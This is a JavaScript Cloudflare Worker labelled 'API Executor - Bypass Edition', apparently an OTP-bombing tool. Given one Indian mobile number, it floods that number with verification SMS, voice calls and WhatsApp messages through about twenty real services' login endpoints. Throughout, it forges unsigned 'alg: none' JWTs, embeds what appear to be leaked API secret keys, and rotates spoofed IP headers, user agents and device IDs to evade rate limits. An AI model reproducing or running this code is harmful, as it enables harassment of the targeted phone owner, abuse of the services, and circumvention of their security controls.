// ========================
// Helper Functions
// ========================

function base64urlEncode(str) {
    return Buffer.from(str).toString('base64')
        .replace(/\+/g, '-')
        .replace(/\//g, '_')
        .replace(/=+$/, '');
}

function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        const r = Math.random() * 16 | 0;
        const v = c === 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}

function randomAndroidId() {
    return Array.from({length: 8}, () => 
        Math.floor(Math.random() * 0xffff).toString(16).padStart(4, '0')
    ).join('');
}

function randomDeviceId() {
    return randomAndroidId();
}

function randomIP() {
    return Math.floor(Math.random() * 255) + 1 + '.' + 
           Math.floor(Math.random() * 256) + '.' + 
           Math.floor(Math.random() * 256) + '.' + 
           (Math.floor(Math.random() * 255) + 1);
}

function randomUserAgent() {
    const androidVersions = ['9', '10', '11', '12', '13', '14'];
    const androidVersion = androidVersions[Math.floor(Math.random() * androidVersions.length)];
    const chromeVersions = ['120', '121', '122', '123', '124', '125', '126', '127', '128', '129', '130', '131', '132', '133', '134', '135', '136', '137', '138', '139', '140', '141', '142', '143', '144', '145', '146', '147', '148'];
    const chromeVersion = chromeVersions[Math.floor(Math.random() * chromeVersions.length)];
    const models = ['RMX3081', 'SM-G998B', 'Pixel 6', 'OnePlus 9', 'SM-A528B', 'M2012K11AG', 'SM-N986B', 'Redmi Note 10', 'SM-G991B', 'Pixel 5'];
    const model = models[Math.floor(Math.random() * models.length)];
    const builds = ['RKQ1.211119.001', 'SP1A.210812.016', 'TP1A.220624.014', 'TQ3A.230901.001'];
    const build = builds[Math.floor(Math.random() * builds.length)];
    return `Mozilla/5.0 (Linux; Android ${androidVersion}; ${model} Build/${build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion}.0.0.0 Mobile Safari/537.36`;
}

function generateAstroyogiToken() {
    const header = JSON.stringify({ alg: 'none', typ: 'JWT' });
    const payload = JSON.stringify({
        UserType: 'TtaAppUser',
        EntityId: '29426901',
        SourceUserType: 'TtaAppUser',
        SourceEntityId: '29426901',
        nbf: Math.floor(Date.now() / 1000),
        exp: Math.floor(Date.now() / 1000) + 7776000
    });
    return base64urlEncode(header) + '.' + base64urlEncode(payload) + '.';
}

function generateAstroyogiWebToken() {
    const header = JSON.stringify({ alg: 'none', typ: 'JWT' });
    const payload = JSON.stringify({
        UserType: 'WebUser',
        EntityId: '0',
        SourceUserType: '',
        SourceEntityId: '',
        nbf: Math.floor(Date.now() / 1000),
        exp: Math.floor(Date.now() / 1000) + 7776000
    });
    return base64urlEncode(header) + '.' + base64urlEncode(payload) + '.';
}

// ========================
// API Call Function
// ========================

async function callAPI(url, method, headers, data = null, retries = 2) {
    for (let attempt = 0; attempt <= retries; attempt++) {
        if (attempt > 0) {
            await new Promise(resolve => setTimeout(resolve, 500 * attempt));
        }
        
        try {
            const options = {
                method: method,
                headers: headers
            };
            
            if (data && method === 'POST') {
                options.body = data;
            }
            
            const response = await fetch(url, options);
            const httpcode = response.status;
            const responseText = await response.text();
            
            if (httpcode >= 200 && httpcode < 300) {
                return { response: responseText, httpcode: httpcode };
            }
            if (httpcode >= 400 && httpcode < 500 && httpcode != 429) {
                return { response: responseText, httpcode: httpcode };
            }
        } catch (error) {
            if (attempt === retries) {
                return { response: error.message, httpcode: 0 };
            }
        }
    }
    return { response: '', httpcode: 0 };
}

// ========================
// API Functions
// ========================

async function api_astroyogi_generate(mobile) {
    const url = 'https://chapp.astroyogi.com/api/UserAccountV3/GenerateOtpV3';
    const data = new URLSearchParams({
        MobileNumber: mobile,
        PhonCode: '91',
        CountryCode: 'IN',
        Plateform: 'Android',
        IsResend: 'false',
        PhoneDeviceId: randomDeviceId()
    }).toString();
    const headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'authorization': 'Bearer ' + generateAstroyogiToken(),
        'User-Agent': randomUserAgent(),
        'X-Forwarded-For': randomIP()
    };
    return callAPI(url, 'POST', headers, data);
}

async function api_astroyogi_voice(mobile) {
    const url = 'https://comm.astroyogi.com/api/OtpComm/SendOtp';
    const data = JSON.stringify({
        countryCode: 'IN',
        mobileNumber: mobile,
        phoneCode: '91',
        phoneDeviceId: randomDeviceId(),
        platform: 'Android',
        requestType: 'call'
    });
    const headers = {
        'Content-Type': 'application/json',
        'authorization': 'Bearer ' + generateAstroyogiToken(),
        'User-Agent': randomUserAgent(),
        'X-Forwarded-For': randomIP()
    };
    return callAPI(url, 'POST', headers, data);
}

async function api_astroyogi_web(mobile) {
    const url = 'https://comm.astroyogi.com/api/OtpComm/SendOtp';
    const data = JSON.stringify({
        phoneCode: '91',
        countryCode: 'IN',
        mobileNumber: mobile,
        platform: 'Web',
        IpAddress: randomIP(),
        requestType: 'call',
        countryCodeByHeader: 'IN'
    });
    const headers = {
        'Content-Type': 'application/json',
        'authorization': 'Bearer ' + generateAstroyogiWebToken(),
        'User-Agent': randomUserAgent(),
        'X-Forwarded-For': randomIP()
    };
    return callAPI(url, 'POST', headers, data);
}

async function api_zomato_sms(mobile) {
    const url = 'https://accounts.zomato.com/login/phone';
    const data = new URLSearchParams({
        number: mobile,
        country_id: '1',
        lc: '26fd3c9af2914791b566f84867425876',
        type: 'initiate',
        verification_type: 'sms',
        package_name: 'com.application.zomato',
        message_uuid: ''
    }).toString();
    const headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Forwarded-For': randomIP()
    };
    return callAPI(url, 'POST', headers, data);
}

async function api_zomato_call(mobile) {
    const url = 'https://accounts.zomato.com/login/phone';
    const data = new URLSearchParams({
        number: mobile,
        country_id: '1',
        lc: '26fd3c9af2914791b566f84867425876',
        type: 'initiate',
        verification_type: 'call',
        package_name: '',
        message_uuid: 'sms-service-v2-' + generateUUID()
    }).toString();
    const headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Forwarded-For': randomIP()
    };
    return callAPI(url, 'POST', headers, data);
}

async function api_udaan_whatsapp(mobile) {
    const url = 'https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true';
    const data = new URLSearchParams({ mobile: mobile }).toString();
    const headers = {
        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'X-Forwarded-For': randomIP()
    };
    return callAPI(url, 'POST', headers, data);
}

async function api_udaan_call(mobile) {
    const url = 'https://auth.udaan.com/api/otp/send?client_id=udaan-v2&getOTPCall=true&whatsappConsent=false';
    const data = new URLSearchParams({ mobile: mobile }).toString();
    const headers = {
        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'X-Forwarded-For': randomIP()
    };
    return callAPI(url, 'POST', headers, data);
}

async function api_clovia(mobile) {
    const url = 'https://www.clovia.com/api/v4/users/send-otp-on-call/';
    const data = JSON.stringify({ phone: mobile, is_signup: 'true', email: '', otp: '' });
    const headers = {
        'Content-Type': 'application/json',
        'secretkey': '_fxv&8)36e@kb8na3nj@azl@hzdkfmpaf)lf0+!kt4tu!=feea',
        'apikey': 'u(ihlye!wv)d6zpiyp@qxyqwlt)86#o%v^t%@ki-i@bm+18x7g',
        'User-Agent': randomUserAgent(),
        'X-Forwarded-For': randomIP()
    };
    return callAPI(url, 'POST', headers, data);
}

async function api_swiggy(mobile) {
    const url = 'https://profile.swiggy.com/api/v3/app/request_call_verification';
    const data = JSON.stringify({ mobile: mobile });
    const headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'X-Forwarded-For': '192.168.1.100'
    };
    return callAPI(url, 'POST', headers, data);
}

async function api_indialends(mobile) {
    const url = 'https://indialends.com/pl/SP_MVResend';
    const data = 'MobileNumber=' + encodeURIComponent(mobile) + '&Mode=2';
    const headers = {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'sec-ch-ua-platform': '"Android"',
        'x-requested-with': 'XMLHttpRequest',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36',
        'accept': '*/*',
        'sec-ch-ua': '"Android WebView";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'origin': 'https://indialends.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://indialends.com/personal-loan',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'priority': 'u=1, i'
    };
    return callAPI(url, 'POST', headers, data);
}

async function api_penpencil(mobile) {
    const url = 'https://api.penpencil.co/v1/users/resend-otp?smsType=2';
    const data = JSON.stringify({ organizationId: '5eb393ee95fab7468a79d189', mobile: mobile });
    const headers = {
        'Content-Type': 'application/json',
        'user-agent': 'okhttp/3.9.1',
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br'
    };
    return callAPI(url, 'POST', headers, data);
}

async function api_happi(mobile) {
    const url = 'https://dev-services.happimobiles.com/api/user-login/homepage';
    const data = JSON.stringify({ phone: mobile });
    const headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'X-Forwarded-For': '192.168.1.100'
    };
    return callAPI(url, 'POST', headers, data);
}

async function api_smartcoin(mobile) {
    const url = 'https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request';
    const data = JSON.stringify({
        phone_number: mobile,
        app_version: '100' + (Math.floor(Math.random() * 100) + 100),
        channel: 'IVR',
        request_type: 'REGISTRATION',
        onboarding_consent: true
    });
    const headers = {
        'Content-Type': 'application/json',
        'X-Forwarded-For': randomIP()
    };
    return callAPI(url, 'POST', headers, data);
}

async function api_heyophone(mobile) {
    const url = 'https://api.heyophone.com/heyo/v1/otp/send';
    const data = JSON.stringify({ country_code: '+91', number: mobile, via: 'call' });
    const headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'x-requested-with': 'XMLHttpRequest',
        'x-device-id': 'f461d071a6b39dff',
        'x-device-type': 'android'
    };
    return callAPI(url, 'POST', headers, data);
}

async function api_dreamplug(mobile) {
    const url = 'https://app-prod.dreamplug.in/otp/v2/resend';
    const data = JSON.stringify({
        channel: 'voice',
        phone: '+91' + mobile.replace(/[^0-9]/g, '')
    });
    const headers = {
        'Content-Type': 'application/json; charset=UTF-8',
        'x-request-id': generateUUID(),
        'x-transaction-id': generateUUID(),
        'x-session-id': generateUUID(),
        'x-installation-id': generateUUID(),
        'x-device-id': generateUUID(),
        'x-application-id': generateUUID(),
        'x-os': 'android',
        'x-os-version': String(Math.floor(Math.random() * 6) + 9),
        'x-os-api-level': String(Math.floor(Math.random() * 7) + 28),
        'x-app-version': '4.8.5.4',
        'x-app-version-code': '40805004',
        'user-agent': 'okhttp/' + (Math.floor(Math.random() * 2) + 3) + '.' + Math.floor(Math.random() * 10) + '.' + Math.floor(Math.random() * 10),
        'X-Forwarded-For': randomIP()
    };
    return callAPI(url, 'POST', headers, data);
}

async function api_magicpin_send(mobile) {
    const url = 'https://auth.magicpin.in/SendOtp/V2/';
    const data = JSON.stringify({
        phone_no: '91' + mobile.replace(/[^0-9]/g, ''),
        sms_service_flag: '0',
        'app-version-name': '1.' + (Math.floor(Math.random() * 100) + 100) + '.' + Math.floor(Math.random() * 10),
        'app-version': Math.floor(Math.random() * 1000) + 1000
    });
    const headers = {
        'Content-Type': 'application/json; charset=UTF-8',
        'User-Agent': 'okhttp/' + (Math.floor(Math.random() * 2) + 3) + '.' + Math.floor(Math.random() * 10) + '.' + Math.floor(Math.random() * 10),
        'package-name': 'com.magicpin.local',
        'X-Forwarded-For': randomIP()
    };
    return callAPI(url, 'POST', headers, data);
}

async function api_magicpin_call(mobile) {
    const url = 'https://auth.magicpin.in/SendOtpByCall/';
    const data = JSON.stringify({
        phone_no: '91' + mobile.replace(/[^0-9]/g, ''),
        'app-version-name': '1.' + (Math.floor(Math.random() * 100) + 100) + '.' + Math.floor(Math.random() * 10),
        'app-version': Math.floor(Math.random() * 1000) + 1000
    });
    const headers = {
        'Content-Type': 'application/json; charset=UTF-8',
        'User-Agent': 'okhttp/' + (Math.floor(Math.random() * 2) + 3) + '.' + Math.floor(Math.random() * 10) + '.' + Math.floor(Math.random() * 10),
        'package-name': 'com.magicpin.local',
        'X-Forwarded-For': randomIP()
    };
    return callAPI(url, 'POST', headers, data);
}

async function api_nikita(mobile) {
    const url = 'https://test-api.nikita973280.workers.dev';
    const data = JSON.stringify({
        endpoint: 'comm',
        phoneNumber: (mobile.length == 10 ? mobile : mobile.substring(mobile.length - 10)),
        countryCode: 'IN',
        phoneCode: '91'
    });
    const headers = {
        'Content-Type': 'application/json',
        'User-Agent': randomUserAgent(),
        'X-Forwarded-For': randomIP()
    };
    return callAPI(url, 'POST', headers, data);
}

async function api_freenow(mobile) {
    const url = 'https://api.live.free-now.com/signupwithphoneservice/v3/passenger/challenge';
    const data = JSON.stringify({
        deviceId: generateUUID(),
        phoneAreaCode: '+91',
        phoneNumber: mobile,
        type: 'VOICE_CALL'
    });
    const headers = {
        'Content-Type': 'application/json',
        'user-agent': 'mytaxi_passenger/13.' + (Math.floor(Math.random() * 20) + 40) + '.0_' + (Math.floor(Math.random() * 100) + 2800) + ' ANDROID/' + (Math.floor(Math.random() * 4) + 11) + ' (RMX3081)',
        'incognia-installation-id': Buffer.from(String(Math.floor(Math.random() * 900000) + 100000) + 
                                            String(Math.floor(Math.random() * 900000) + 100000) +
                                            String(Math.floor(Math.random() * 900000) + 100000) +
                                            String(Math.floor(Math.random() * 900000) + 100000) +
                                            String(Math.floor(Math.random() * 900000) + 100000)).toString('base64'),
        'session-id': generateUUID(),
        'x-myt-request-id': generateUUID(),
        'X-Forwarded-For': randomIP()
    };
    return callAPI(url, 'POST', headers, data);
}

async function api_chaayos(mobile) {
    const url = 'https://dine.chaayos.com/app-crm/v2/crm/v/r2-ivr/1000';
    const data = JSON.stringify({ mobileNumber: mobile });
    const headers = {
        'Content-Type': 'application/json',
        'X-Forwarded-For': randomIP()
    };
    return callAPI(url, 'POST', headers, data);
}

// ========================
// Cloudflare Worker Handler
// ========================

export default {
    async fetch(request, env, ctx) {
        const url = new URL(request.url);
        const mobile = url.searchParams.get('mobile');
        
        // Agar mobile number nahi hai toh HTML form show karo
        if (!mobile) {
            return new Response(`
                <!DOCTYPE html>
                <html>
                <head>
                    <title>API Executor - Bypass Edition</title>
                    <style>
                        body { font-family: Arial, sans-serif; max-width: 900px; margin: 20px auto; padding: 20px; }
                        input[type="text"] { padding: 10px; width: 250px; border: 2px solid #ddd; border-radius: 5px; font-size: 16px; }
                        button { padding: 10px 30px; background: #007bff; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
                        button:hover { background: #0056b3; }
                        h1 { color: #333; }
                        .info { background: #e8f4fd; padding: 15px; border-radius: 5px; margin: 20px 0; }
                    </style>
                </head>
                <body>
                    <h1>🚀 API Executor - Bypass Edition</h1>
                    <div class="info">
                        <strong>Features:</strong>
                        <ul>
                            <li>Fresh JWT tokens generated for each request</li>
                            <li>Random device IDs and fingerprints</li>
                            <li>Different User-Agent per request</li>
                            <li>Random IP addresses (X-Forwarded-For)</li>
                            <li>Auto-retry on failure</li>
                        </ul>
                    </div>
                    <form method="get" action="">
                        <label for="mobile">Enter Mobile Number:</label>
                        <input type="text" id="mobile" name="mobile" placeholder="Enter 10 digit number" required>
                        <button type="submit">Submit</button>
                    </form>
                </body>
                </html>
            `, {
                headers: { 'Content-Type': 'text/html' }
            });
        }
        
        // Mobile number validate karo
        const cleanMobile = mobile.replace(/[^0-9]/g, '');
        if (cleanMobile.length !== 10) {
            return new Response('Please enter a valid 10-digit mobile number', {
                status: 400,
                headers: { 'Content-Type': 'text/plain' }
            });
        }
        
        // APIs list
        const apis = [
            { name: 'Astroyogi GenerateOtpV3', func: api_astroyogi_generate },
            { name: 'Astroyogi SendOtp (Voice)', func: api_astroyogi_voice },
            { name: 'Astroyogi SendOtp (Web)', func: api_astroyogi_web },
            { name: 'Zomato SMS Verification', func: api_zomato_sms },
            { name: 'Zomato Call Verification', func: api_zomato_call },
            { name: 'Udaan - WhatsApp OTP', func: api_udaan_whatsapp },
            { name: 'Udaan - Call OTP', func: api_udaan_call },
            { name: 'Clovia - OTP on Call', func: api_clovia },
            { name: 'Swiggy - Call Verification', func: api_swiggy },
            { name: 'IndiaLends - Resend OTP', func: api_indialends },
            { name: 'PenPencil - Resend OTP', func: api_penpencil },
            { name: 'Happi Mobiles - Login', func: api_happi },
            { name: 'Smartcoin - OTP Request', func: api_smartcoin },
            { name: 'HeyoPhone - Voice OTP', func: api_heyophone },
            { name: 'Dreamplug - Resend OTP', func: api_dreamplug },
            { name: 'Magicpin - Send OTP V2', func: api_magicpin_send },
            { name: 'Magicpin - Send OTP Call', func: api_magicpin_call },
            { name: 'Nikita Worker - OTP Relay', func: api_nikita },
            { name: 'FreeNow - Voice Call', func: api_freenow },
            { name: 'Chaayos - IVR Call', func: api_chaayos }
        ];
        
        // Sab APIs call karo
        const results = [];
        for (let i = 0; i < apis.length; i++) {
            try {
                const result = await apis[i].func(cleanMobile);
                results.push({
                    name: apis[i].name,
                    status: result.httpcode,
                    response: result.response.substring(0, 200)
                });
            } catch (error) {
                results.push({
                    name: apis[i].name,
                    status: 'error',
                    response: error.message
                });
            }
            // Rate limit avoid karne ke liye thoda wait
            await new Promise(resolve => setTimeout(resolve, 200));
        }
        
        // JSON response return karo
        return new Response(JSON.stringify({
            mobile: mobile,
            total: results.length,
            results: results
        }, null, 2), {
            headers: { 
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            }
        });
    }
};
